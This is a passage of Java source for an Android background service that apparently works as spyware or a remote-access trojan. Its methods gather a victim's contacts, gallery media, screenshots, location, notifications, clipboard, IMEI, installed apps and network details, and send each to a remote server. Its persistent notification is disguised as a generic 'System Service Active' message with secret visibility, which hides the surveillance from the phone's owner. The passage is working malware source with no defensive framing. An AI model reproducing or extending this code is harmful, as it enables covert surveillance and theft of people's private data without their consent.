                cursor.close();
            }
        }
    }

    private void getContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Cursor cursor = null;
        try {
            String[] projection = {
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.LABEL,
                    ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
                    ContactsContract.CommonDataKinds.Phone.STARRED
            };

            cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            JSONArray contacts = new JSONArray();

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    try {
                        long contactId = cursor.getLong(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));
                        String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL));
                        String photoUri = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));
                        int starred = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.STARRED));

                        contact.put("contact_id", contactId);
                        contact.put("name", name != null ? name : "Unknown");
                        contact.put("number", number != null ? number : "");
                        contact.put("type", getContactTypeString(type));
                        contact.put("label", label != null ? label : "");
                        contact.put("photo_uri", photoUri != null ? photoUri : "");
                        contact.put("is_starred", starred == 1);

                        contacts.put(contact);
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing contact entry", e);
                    }
                } while (cursor.moveToNext());
            }

            JSONObject response = new JSONObject();
            response.put("type", "contacts");
            response.put("device_id", deviceId);
            response.put("data", contacts);
            response.put("count", contacts.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + contacts.length() + " contacts");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get contacts", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void getAllGalleryImages() {
        boolean hasPermission = false;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }

        if (!hasPermission) {
            return;
        }

        getMediaFiles("images");
        getMediaFiles("videos");
        getMediaFiles("audio");
    }

    private void getMediaFiles(String mediaType) {
        Cursor cursor = null;
        try {
            Uri contentUri;
            String[] projection;
            String sortOrder;

            if ("images".equals(mediaType)) {
                contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                projection = new String[]{
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.DATA,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DATE_ADDED,
                        MediaStore.Images.Media.DATE_MODIFIED,
                        MediaStore.Images.Media.WIDTH,
                        MediaStore.Images.Media.HEIGHT,
                        MediaStore.Images.Media.MIME_TYPE,
                        MediaStore.Images.Media.ORIENTATION
                };
                sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 1000";
            } else if ("videos".equals(mediaType)) {
                contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                projection = new String[]{
                        MediaStore.Video.Media._ID,
                        MediaStore.Video.Media.DISPLAY_NAME,
                        MediaStore.Video.Media.DATA,
                        MediaStore.Video.Media.SIZE,
                        MediaStore.Video.Media.DATE_ADDED,
                        MediaStore.Video.Media.DATE_MODIFIED,
                        MediaStore.Video.Media.WIDTH,
                        MediaStore.Video.Media.HEIGHT,
                        MediaStore.Video.Media.DURATION,
                        MediaStore.Video.Media.MIME_TYPE
                };
                sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 1000";
            } else { // audio
                contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                projection = new String[]{
                        MediaStore.Audio.Media._ID,
                        MediaStore.Audio.Media.DISPLAY_NAME,
                        MediaStore.Audio.Media.DATA,
                        MediaStore.Audio.Media.SIZE,
                        MediaStore.Audio.Media.DATE_ADDED,
                        MediaStore.Audio.Media.DATE_MODIFIED,
                        MediaStore.Audio.Media.DURATION,
                        MediaStore.Audio.Media.MIME_TYPE,
                        MediaStore.Audio.Media.ARTIST,
                        MediaStore.Audio.Media.ALBUM
                };
                sortOrder = MediaStore.Audio.Media.DATE_ADDED + " DESC LIMIT 1000";
            }

            cursor = getContentResolver().query(contentUri, projection, null, null, sortOrder);
            JSONArray mediaArray = new JSONArray();

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject media = new JSONObject();
                    try {
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow(projection[0]));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(projection[1]));
                        String path = cursor.getString(cursor.getColumnIndexOrThrow(projection[2]));
                        long size = cursor.getLong(cursor.getColumnIndexOrThrow(projection[3]));
                        long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(projection[4]));
                        long dateModified = cursor.getLong(cursor.getColumnIndexOrThrow(projection[5]));
                        String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(projection[projection.length - 1]));

                        media.put("id", id);
                        media.put("name", name != null ? name : "");
                        media.put("path", path != null ? path : "");
                        media.put("size", size);
                        media.put("size_formatted", formatBytes(size));
                        media.put("date_added", dateAdded * 1000);
                        media.put("date_modified", dateModified * 1000);
                        media.put("mime_type", mimeType != null ? mimeType : "");
                        media.put("type", mediaType);

                        if ("images".equals(mediaType)) {
                            int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH));
                            int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT));
                            int orientation = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.ORIENTATION));
                            media.put("width", width);
                            media.put("height", height);
                            media.put("orientation", orientation);
                        } else if ("videos".equals(mediaType)) {
                            int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH));
                            int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT));
                            long duration = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION));
                            media.put("width", width);
                            media.put("height", height);
                            media.put("duration", duration);
                            media.put("duration_formatted", formatDuration(duration / 1000));
                        } else if ("audio".equals(mediaType)) {
                            long duration = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION));
                            String artist = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST));
                            String album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ALBUM));
                            media.put("duration", duration);
                            media.put("duration_formatted", formatDuration(duration / 1000));
                            media.put("artist", artist != null ? artist : "Unknown");
                            media.put("album", album != null ? album : "Unknown");
                        }

                        media.put("formatted_date_added", new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(dateAdded * 1000)));

                        mediaArray.put(media);
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing " + mediaType + " entry", e);
                    }
                } while (cursor.moveToNext());
            }

            JSONObject response = new JSONObject();
            response.put("type", "gallery_" + mediaType);
            response.put("device_id", deviceId);
            response.put("data", mediaArray);
            response.put("count", mediaArray.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + mediaArray.length() + " " + mediaType + " files");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get " + mediaType + " files", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void captureScreen() {
        try {
            if (!screenCaptureInitialized || imageReader == null || virtualDisplay == null) {
                Log.w(TAG, "Screen capture not initialized");
                return;
            }

            Thread.sleep(500);

            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                try {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * image.getWidth();

                    Bitmap bitmap = Bitmap.createBitmap(
                            image.getWidth() + rowPadding / pixelStride,
                            image.getHeight(),
                            Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    Bitmap croppedBitmap = Bitmap.createBitmap(
                            bitmap, 0, 0, image.getWidth(), image.getHeight());

                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    String encodedImage = Base64.encodeToString(byteArray, Base64.NO_WRAP);

                    JSONObject response = new JSONObject();
                    response.put("type", "screenshot");
                    response.put("device_id", deviceId);
                    response.put("status", "success");
                    response.put("data", encodedImage);
                    response.put("width", image.getWidth());
                    response.put("height", image.getHeight());
                    response.put("format", "jpeg");
                    response.put("timestamp", System.currentTimeMillis());

                    sendDataToServer(response);
                    Log.d(TAG, "Screenshot captured successfully");

                    bitmap.recycle();
                    croppedBitmap.recycle();
                    byteArrayOutputStream.close();

                } finally {
                    image.close();
                }
            } else {
                Log.w(TAG, "No image available for screenshot");
            }

        } catch (Exception e) {
            Log.e(TAG, "Failed to capture screen", e);
        }
    }

    // Helper methods
    private String formatDuration(long seconds) {
        long hours = seconds / 3600;
        long minutes = (seconds % 3600) / 60;
        long secs = seconds % 60;

        if (hours > 0) {
            return String.format(Locale.getDefault(), "%02d:%02d:%02d", hours, minutes, secs);
        } else {
            return String.format(Locale.getDefault(), "%02d:%02d", minutes, secs);
        }
    }

    private String formatBytes(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int z = (63 - Long.numberOfLeadingZeros(bytes)) / 10;
        return String.format(Locale.getDefault(), "%.1f %sB", (double) bytes / (1L << (z * 10)), " KMGTPE".charAt(z));
    }

    private boolean checkAudioPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }

    private boolean checkCameraPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    private String getDeviceIPAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        boolean isIPv4 = sAddr.indexOf(':') < 0;
                        if (isIPv4) {
                            return sAddr;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IP address", e);
        }
        return "Unknown";
    }

    private String getDeviceIMEI() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (telephonyManager != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        return telephonyManager.getImei();
                    } else {
                        return telephonyManager.getDeviceId();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IMEI", e);
        }
        return "Permission denied or not available";
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            default:
                return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case 1: return "Inbox";
            case 2: return "Sent";
            case 3: return "Draft";
            case 4: return "Outbox";
            case 5: return "Failed";
            case 6: return "Queued";
            default: return "Unknown";
        }
    }

    private String getContactTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Home Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Work Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            default:
                return "Other";
        }
    }

    // Continue with remaining methods...
    private void getCurrentLocation() {
        if (lastKnownLocation != null) {
            sendLocationUpdate(lastKnownLocation);
        } else {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED) {
                    Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (location == null) {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                    if (location != null) {
                        sendLocationUpdate(location);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to get location", e);
            }
        }
    }

    private void getNotifications() {
        try {
            JSONObject response = new JSONObject();
            response.put("type", "notifications");
            response.put("device_id", deviceId);

            JSONArray notificationsArray = new JSONArray();
            for (JSONObject notification : capturedNotifications) {
                notificationsArray.put(notification);
            }

            response.put("data", notificationsArray);
            response.put("count", capturedNotifications.size());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + capturedNotifications.size() + " notifications");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get notifications", e);
        }
    }

    private void getInstalledApps() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

            JSONArray appsArray = new JSONArray();

            for (ApplicationInfo app : apps) {
                try {
                    JSONObject appInfo = new JSONObject();
                    appInfo.put("package_name", app.packageName);
                    appInfo.put("app_name", pm.getApplicationLabel(app).toString());
                    appInfo.put("is_system_app", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                    appInfo.put("enabled", app.enabled);
                    appInfo.put("target_sdk", app.targetSdkVersion);
                    appInfo.put("uid", app.uid);

                    try {
                        PackageInfo packageInfo = pm.getPackageInfo(app.packageName, 0);
                        appInfo.put("version_name", packageInfo.versionName);
                        appInfo.put("version_code", packageInfo.versionCode);
                        appInfo.put("first_install_time", packageInfo.firstInstallTime);
                        appInfo.put("last_update_time", packageInfo.lastUpdateTime);
                    } catch (PackageManager.NameNotFoundException e) {
                        Log.w(TAG, "Package info not found for: " + app.packageName);
                    }

                    appsArray.put(appInfo);
                } catch (Exception e) {
                    Log.e(TAG, "Error processing app: " + app.packageName, e);
                }
            }

            JSONObject response = new JSONObject();
            response.put("type", "installed_apps");
            response.put("device_id", deviceId);
            response.put("data", appsArray);
            response.put("count", appsArray.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + appsArray.length() + " installed apps");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get installed apps", e);
        }
    }

    private void getNetworkInfo() {
        try {
            JSONObject networkInfo = new JSONObject();

            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (connectivityManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Network activeNetwork = connectivityManager.getActiveNetwork();
                    if (activeNetwork != null) {
                        NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(activeNetwork);
                        if (networkCapabilities != null) {
                            if (networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                                networkInfo.put("network_type", "WIFI");

                                // Get WiFi details
                                WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                                if (wifiManager != null) {
                                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                                    networkInfo.put("wifi_ssid", wifiInfo.getSSID());
                                    networkInfo.put("wifi_bssid", wifiInfo.getBSSID());
                                    networkInfo.put("wifi_rssi", wifiInfo.getRssi());
                                    networkInfo.put("wifi_link_speed", wifiInfo.getLinkSpeed());
                                }
                            } else if (networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                                networkInfo.put("network_type", "MOBILE");

                                // Get cellular details
                                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                                if (telephonyManager != null) {
                                    networkInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                                    networkInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                                    networkInfo.put("network_country", telephonyManager.getNetworkCountryIso());
                                }
                            }

                            networkInfo.put("download_bandwidth", networkCapabilities.getLinkDownstreamBandwidthKbps());
                            networkInfo.put("upload_bandwidth", networkCapabilities.getLinkUpstreamBandwidthKbps());
                        }
                    }
                }
            }

            networkInfo.put("device_ip", getDeviceIPAddress());

            JSONObject response = new JSONObject();
            response.put("type", "network_info");
            response.put("device_id", deviceId);
            response.put("data", networkInfo);
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Network info sent successfully");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get network info", e);
        }
    }

    private void getBatteryInfo() {
        try {
            JSONObject batteryInfo = new JSONObject();

            IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, batteryFilter);

            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
                int plugged = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                String technology = batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
                int voltage = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);

                float batteryPercent = level * 100 / (float) scale;

                batteryInfo.put("level", level);
                batteryInfo.put("scale", scale);
                batteryInfo.put("percentage", batteryPercent);
                batteryInfo.put("status", getBatteryStatusString(status));
                batteryInfo.put("health", getBatteryHealthString(health));
                batteryInfo.put("plugged", getBatteryPluggedString(plugged));
                batteryInfo.put("technology", technology != null ? technology : "Unknown");
                batteryInfo.put("temperature", temperature / 10.0); // Convert to Celsius
                batteryInfo.put("voltage", voltage / 1000.0); // Convert to Volts
                batteryInfo.put("is_charging", status == BatteryManager.BATTERY_STATUS_CHARGING);
            }

            JSONObject response = new JSONObject();
            response.put("type", "battery_info");
            response.put("device_id", deviceId);
            response.put("data", batteryInfo);
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Battery info sent");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get battery info", e);
        }
    }

    private void getSystemInfo() {
        try {
            JSONObject systemInfo = new JSONObject();

            systemInfo.put("brand", Build.BRAND);
            systemInfo.put("manufacturer", Build.MANUFACTURER);
            systemInfo.put("model", Build.MODEL);
            systemInfo.put("product", Build.PRODUCT);
            systemInfo.put("device", Build.DEVICE);
            systemInfo.put("board", Build.BOARD);
            systemInfo.put("hardware", Build.HARDWARE);
            systemInfo.put("android_version", Build.VERSION.RELEASE);
            systemInfo.put("api_level", Build.VERSION.SDK_INT);
            systemInfo.put("security_patch", Build.VERSION.SECURITY_PATCH);
            systemInfo.put("bootloader", Build.BOOTLOADER);
            systemInfo.put("fingerprint", Build.FINGERPRINT);

            Runtime runtime = Runtime.getRuntime();
            systemInfo.put("total_memory", runtime.totalMemory());
            systemInfo.put("free_memory", runtime.freeMemory());
            systemInfo.put("max_memory", runtime.maxMemory());
            systemInfo.put("available_processors", runtime.availableProcessors());

            // CPU information
            systemInfo.put("cpu_abi", Build.CPU_ABI);
            systemInfo.put("cpu_abi2", Build.CPU_ABI2);

            JSONObject response = new JSONObject();
            response.put("type", "system_info");
            response.put("device_id", deviceId);
            response.put("data", systemInfo);
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "System info sent");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get system info", e);
        }
    }

    private void getDeviceStorageInfo() {
        try {
            JSONObject storageInfo = new JSONObject();

            File internalDir = Environment.getDataDirectory();
            long internalTotal = internalDir.getTotalSpace();
            long internalFree = internalDir.getFreeSpace();
            long internalUsed = internalTotal - internalFree;

            storageInfo.put("internal_total", internalTotal);
            storageInfo.put("internal_free", internalFree);
            storageInfo.put("internal_used", internalUsed);
            storageInfo.put("internal_total_formatted", formatBytes(internalTotal));
            storageInfo.put("internal_free_formatted", formatBytes(internalFree));
            storageInfo.put("internal_used_formatted", formatBytes(internalUsed));

            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                File externalDir = Environment.getExternalStorageDirectory();
                long externalTotal = externalDir.getTotalSpace();
                long externalFree = externalDir.getFreeSpace();
                long externalUsed = externalTotal - externalFree;

                storageInfo.put("external_total", externalTotal);
                storageInfo.put("external_free", externalFree);
                storageInfo.put("external_used", externalUsed);
                storageInfo.put("external_total_formatted", formatBytes(externalTotal));
                storageInfo.put("external_free_formatted", formatBytes(externalFree));
                storageInfo.put("external_used_formatted", formatBytes(externalUsed));
            }

            JSONObject response = new JSONObject();
            response.put("type", "device_storage");
            response.put("device_id", deviceId);
            response.put("data", storageInfo);
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Device storage info sent");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get device storage info", e);
        }
    }

    private void getClipboardContent() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                ClipData clipData = clipboard.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    ClipData.Item item = clipData.getItemAt(0);
                    String clipText = item.getText() != null ? item.getText().toString() : "";

                    JSONObject response = new JSONObject();
                    response.put("type", "clipboard");
                    response.put("device_id", deviceId);
                    response.put("content", clipText);
                    response.put("timestamp", System.currentTimeMillis());

                    sendDataToServer(response);
                    Log.d(TAG, "Clipboard content sent");
                    return;
                }
            }

            JSONObject response = new JSONObject();
            response.put("type", "clipboard");
            response.put("device_id", deviceId);
            response.put("content", "");
            response.put("message", "Clipboard is empty");
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);

        } catch (Exception e) {
            Log.e(TAG, "Failed to get clipboard content", e);
        }
    }

    private String getBatteryStatusString(int status) {
        switch (status) {
            case BatteryManager.BATTERY_STATUS_CHARGING: return "Charging";
            case BatteryManager.BATTERY_STATUS_DISCHARGING: return "Discharging";
            case BatteryManager.BATTERY_STATUS_FULL: return "Full";
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING: return "Not Charging";
            case BatteryManager.BATTERY_STATUS_UNKNOWN: return "Unknown";
            default: return "Unknown";
        }
    }

    private String getBatteryHealthString(int health) {
        switch (health) {
            case BatteryManager.BATTERY_HEALTH_GOOD: return "Good";
            case BatteryManager.BATTERY_HEALTH_OVERHEAT: return "Overheat";
            case BatteryManager.BATTERY_HEALTH_DEAD: return "Dead";
            case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE: return "Over Voltage";
            case BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE: return "Unspecified Failure";
            case BatteryManager.BATTERY_HEALTH_COLD: return "Cold";
            default: return "Unknown";
        }
    }

    private String getBatteryPluggedString(int plugged) {
        switch (plugged) {
            case BatteryManager.BATTERY_PLUGGED_AC: return "AC";
            case BatteryManager.BATTERY_PLUGGED_USB: return "USB";
            case BatteryManager.BATTERY_PLUGGED_WIRELESS: return "Wireless";
            case 0: return "Not Plugged";
            default: return "Unknown";
        }
    }

    private void initializeScreenCapture() {
        try {
            if (screenCaptureIntent == null) {
                Log.w(TAG, "No screen capture intent available");
                screenCaptureInitialized = false;
                return;
            }

            MediaProjectionManager projectionManager =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

            if (projectionManager != null) {
                mediaProjection = projectionManager.getMediaProjection(
                        Activity.RESULT_OK, screenCaptureIntent);

                if (mediaProjection != null) {
                    WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                    DisplayMetrics metrics = new DisplayMetrics();
                    windowManager.getDefaultDisplay().getMetrics(metrics);

                    int width = Math.min(metrics.widthPixels, 1080);
                    int height = Math.min(metrics.heightPixels, 1920);

                    imageReader = ImageReader.newInstance(
                            width, height, PixelFormat.RGBA_8888, 2);

                    virtualDisplay = mediaProjection.createVirtualDisplay(
                            "ScreenCapture",
                            width, height, metrics.densityDpi,
                            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                            imageReader.getSurface(), null, null);

                    screenCaptureInitialized = true;
                    Log.d(TAG, "Screen capture initialized successfully");
                } else {
                    screenCaptureInitialized = false;
                    Log.e(TAG, "Failed to create MediaProjection");
                }
            } else {
                screenCaptureInitialized = false;
                Log.e(TAG, "MediaProjectionManager not available");
            }
        } catch (Exception e) {
            screenCaptureInitialized = false;
            Log.e(TAG, "Failed to initialize screen capture", e);
        }
    }

    private void sendConnectionStatus(boolean connected, String message) {
        Intent statusIntent = new Intent("CONNECTION_STATUS");
        statusIntent.putExtra("connected", connected);
        statusIntent.putExtra("message", message);
        sendBroadcast(statusIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Remote Access Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Remote access service is running");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                        PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service Active")
                .setContentText("Secure system monitoring and data synchronization")
                .setSmallIcon(android.R.drawable.ic_dialog_info) // Replace with custom icon
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setShowWhen(false)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isConnected = false;
        screenCaptureInitialized = false;
        isLocationTracking = false;
        isPollingCommands = false;

        // Stop audio recording
        stopAudioRecording();

        // Stop camera stream
        stopCameraStream();

        // Stop location tracking
        if (locationManager != null) {
            try {
                locationManager.removeUpdates(this);
            } catch (Exception e) {
                Log.e(TAG, "Error removing location updates", e);
            }
        }

        // Clean up media projection resources
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }

        if (mediaProjection != null) {
            mediaProjection.stop();
        }

        if (imageReader != null) {
            imageReader.close();
        }

        // Shutdown executors
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdown();
            try {
                if (!executorService.awaitTermination(5, TimeUnit.SECONDS)) {
                    executorService.shutdownNow();
                }
            } catch (InterruptedException e) {
                executorService.shutdownNow();
            }
        }

        if (scheduledExecutor != null && !scheduledExecutor.isShutdown()) {
            scheduledExecutor.shutdown();
            try {
                if (!scheduledExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduledExecutor.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduledExecutor.shutdownNow();
            }
        }

        // Unregister notification receiver
        try {
            unregisterReceiver(notificationReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Error unregistering notification receiver", e);
        }

        // Shutdown HTTP client
        if (httpClient != null) {
            httpClient.dispatcher().executorService().shutdown();
            httpClient.connectionPool().evictAll();
        }

        Log.d(TAG, "RemoteService destroyed");
    }
}